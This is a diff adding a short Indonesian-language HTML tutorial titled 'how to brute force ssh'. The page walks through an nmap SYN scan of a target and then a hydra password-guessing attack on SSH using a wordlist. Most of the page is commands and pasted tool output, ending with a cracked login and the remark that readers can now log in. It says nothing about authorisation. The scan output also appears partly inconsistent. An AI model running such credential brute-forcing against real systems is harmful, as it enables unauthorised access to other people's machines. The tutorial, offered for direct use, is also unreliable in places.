@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>how to brute force ssh</title>
+        <style>
+
+           @import url('https://fonts.googleapis.com/css2?family=Azeret+Mono&display=swap');
+
+           body {
+               background-color: black;
+
+           }
+
+           .bfssh {
+               color: green;
+               margin: 50px;
+               font-size: 20px;
+               font-family: 'Azeret Mono', monospace;
+
+           }
+
+        </style>
+    </head>
+    <body>
+        <div class="bfssh">
+            <h2>how to brute force ssh</h2>
+            <p>cara brute force ssh menggunakan hydra<br>
+                <br>
+                tools yang di butuhkan yaitu hydra dan nmap<br>
+                <br>
+                hydra untuk ngbrute force password nya <br>
+                nmap untuk scaning port nya <br>
+                <br>
+                tips :<br>
+                <br>
+                kali@kali:~# nmap -sS -sV -v ip target<br>
+                <br>
+                itiating ARP Ping Scan at 22:32<br>
+                Scanning 192.168.1.1 [1 port]<br>
+                Completed ARP Ping Scan at 22:32, 0.05s elapsed (1 total hosts)<br>
+                Initiating Parallel DNS resolution of 1 host. at 22:32<br>
+                Completed Parallel DNS resolution of 1 host. at 22:32, 0.13s elapsed<br>
+                Initiating SYN Stealth Scan at 22:32<br>
+                Scanning gpon.net (192.168.1.1) [1000 ports]<br>
+                Discovered open port 53/tcp on 192.168.1.1<br>
+                Discovered open port 80/tcp on 192.168.1.1<br>
+                Discovered open port 443/tcp on 192.168.1.1<br>
+                Completed SYN Stealth Scan at 22:32, 1.90s elapsed (1000 total ports)<br>
+                Nmap scan report for gpon.net (192.168.1.1)<br>
+                Host is up (0.067s latency).<br>
+                Not shown: 996 closed tcp ports (reset)<br>
+                PORT    STATE    SERVICE<br>\
+                22/tcp  open     ssh
+                23/tcp  filtered telnet<br>
+                53/tcp  open     domain<br>
+                80/tcp  open     http<br>
+                443/tcp open     https<br>
+                MAC Address: EC:F0:FE:8F:75:46 (zte)<br>
+                <br>
+                kalo ssh nya open seperti ini kelian bisa ngebrute force ssh nya<br>
+                ikuti perintah gw di sini<br>
+                kali@kali:~# hydra -h <br>    
+                <br>
+                Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br>
+                <br>
+                Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]<br>
+                <br>
+                Options:<br>
+                  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE<br>
+                  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE<br>
+                  -C FILE   colon separated "login:pass" format, instead of -L/-P options<br>
+                  -M FILE   list of servers to attack, one entry per line, ':' to specify port<br>
+                  -t TASKS  run TASKS number of connects in parallel per target (default: 16)<br>
+                  -U        service module usage details<br>
+                  -m OPT    options specific for a module, see -U output for information<br>
+                  -h        more command line options (COMPLETE HELP)<br>
+                  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)<br>
+                  service   the service to crack (see below for supported protocols)<br>
+                  OPT       some service modules support additional input (-U for module help)<br>
+                  <br>
+                Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp<br>
+                <br>
+                Hydra is a tool to guess/crack valid login/password pairs.<br>
+                Licensed under AGPL v3.0. The newest version is always available at;<br>
+                https://github.com/vanhauser-thc/thc-hydra<br>
+                Please don't use in military or secret service organizations, or for illegal<br>
+                purposes. (This is a wish and non-binding - most such people do not care about<br>
+                laws and ethics anyway - and tell themselves they are one of the good ones.)<br>
+                <br>
+                Example:  hydra -l user -P passlist.txt ftp://192.168.0.1<br>
+                <br>
+                ketik:<br>
+                <br>
+                kali@kali:~# hydra -l (username target/root) -P /path/wordlist.txt ssh://target ip<br>
+                <br>
+                Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br>
+                <br>
+                Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-14 22:40:35<br>
+                [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>
+                [DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task<br>
+                [DATA] attacking ssh://192.168.1.19:22/<br>
+                [22][ssh] host: 192.168.1.19   login: msfadmin   password: msfadmin<br>
+                1 of 1 target successfully completed, 1 valid password found<br>
+                Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-14 22:40:38<br>
+                <br>
+                kalo sudah muncul seperti ini bearti sudah ke crack dan kalian tinggal login ke ssh nya <br>
+                </p>
+        </div>
+    </body>
+</html>
